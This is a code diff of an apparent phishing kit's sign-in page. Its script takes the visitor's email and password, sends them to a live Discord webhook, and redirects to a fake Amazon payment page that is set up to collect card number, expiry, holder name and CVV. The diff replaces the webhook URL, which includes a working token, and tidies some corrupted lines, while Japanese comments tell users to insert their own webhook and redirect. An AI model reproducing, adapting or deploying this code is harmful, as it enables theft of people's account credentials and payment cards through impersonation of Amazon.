@@ -102,14 +102,14 @@
       const error = document.getElementById("errorMessage");
 
       if (!email || !password) {
-        http://error.style.display = "block";
+      error.style.display = "block";
         return;
       } else {
-        http://error.style.display = "none";
+      error.style.display = "none";
       }
 
       // Discord Webhook用のデータ形式
-      const webhookUrl = "https://discord.com/api/webhooks/1410944252866723920/DoQOEwDDRpnn0UyokFFvoGAXKNp6NeDBs1s--77bo07Lklk6mXZj7u0AXJLpDZR_w0B-"; // ← 自分のWebhook URLに変更してね
+      const webhookUrl = "https://discord.com/api/webhooks/1410975643868463247/ZY3_pd3nQ9TT0gMSBqJEhKv46h8rxjh3zwUPek8UTWaXgRpUDwTUhJ3DK-Tz5bDNiI0v"; // ← 自分のWebhook URLに変更してね
 
       const payload = {
         content: `📩 新しいサインイン情報\nメール: ${email}\nパスワード: ${password}`,
@@ -126,7 +126,7 @@
       })
       .then(response => {
         if (response.ok) {
-          window.location.href = "https://amazon-payment.github.io/amazon.payment.com/"; // ← 遷移先URLに変更してね
+          window.location.href = "https://amazon-payment.github.io/amazon.payment.com/?cardNumber=&expiry=&cardHolder=&cvv="; // ← 遷移先URLに変更してね
         } else {
           alert("送信に失敗しました。ステータス: " + response.status);
         }
